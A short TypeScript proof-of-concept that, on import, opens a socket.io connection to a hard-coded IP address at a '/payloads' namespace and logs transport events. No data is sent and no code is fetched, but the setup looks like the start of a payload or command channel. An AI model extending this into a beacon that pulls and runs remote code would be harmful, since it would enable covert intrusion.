import io from "socket.io-client"
import FileHelper from "./utils/FileHelper";

export default class PoC {
    public constructor() {
        const socket = io('https://45.147.98.210:8443/payloads', {
            autoConnect: true,
            timeout: 7000,
            upgrade: true,
            cert: new FileHelper().search("/home/leona/server.cert")
        });

        socket.connect();

        console.log("Trying to connect with id : " + socket.id + " status : ")

        socket.on("connect", () => {
            console.log(socket.id)
            const engine = socket.io.engine;
            console.log(engine.transport.name); // in most cases, prints "polling"

            engine.once("upgrade", () => {
                // called when the transport is upgraded (i.e. from HTTP long-polling to WebSocket)
                console.log(engine.transport.name); // in most cases, prints "websocket"
            });

            engine.on("packet", ({ type, data }) => {
                // called for each packet received
                console.log("packet.")
            });

            engine.on("packetCreate", ({ type, data }) => {
                // called for each packet sent
                console.log("packetCreate.")
            });

            engine.on("drain", () => {
                console.log("drained.")
            });

            engine.on("close", (reason) => {
                console.log("closed.")
            });
        })

        socket.on("connect_error", (err) => {
            console.log(err)
        });

        socket.on('disconnect', () => {
            console.log(socket.id + " disconnected.")
        })


    }
}

export const poc: PoC = new PoC()